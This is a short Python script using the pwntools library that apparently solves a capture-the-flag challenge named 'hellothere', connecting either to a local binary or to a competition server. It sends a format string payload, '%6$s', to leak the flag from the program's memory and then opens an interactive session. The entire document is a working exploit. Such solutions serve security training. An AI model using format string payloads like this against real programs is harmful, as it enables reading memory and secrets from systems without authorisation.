from pwn import *

e = ELF("./hellothere",checksec=False)
context.binary = e

if args.REMOTE:
  pipe = remote("pwn-2021.duc.tf", 31918)
else:
  pipe = process(e.path)

# leak the flag with a format string exploit
pipe.sendlineafter(b"name?\n",b"%6$s")

pipe.interactive()
